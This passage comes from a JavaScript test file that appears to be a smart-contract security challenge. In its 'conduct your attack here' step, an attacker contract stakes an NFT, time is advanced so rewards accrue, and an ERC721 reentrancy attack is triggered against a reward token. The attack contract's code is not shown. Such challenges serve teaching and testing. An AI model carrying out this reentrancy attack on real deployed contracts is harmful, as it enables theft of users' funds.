...
describe(NAME, function () {
    ...
    describe("exploit", async function () {
        ...
        it("conduct your attack here", async function () {
			// 1. Stake token
			await attackerContract.stake(NFTToStakeContract.address, depositoorContract.address);
			
			// 2. Wait for some rewards to accrue
			await time.increase(3600 * 24 * 5);

			// 3. take advantage of ERC721 reentrancy
			await attackerContract.attack(rewardTokenContract.address);
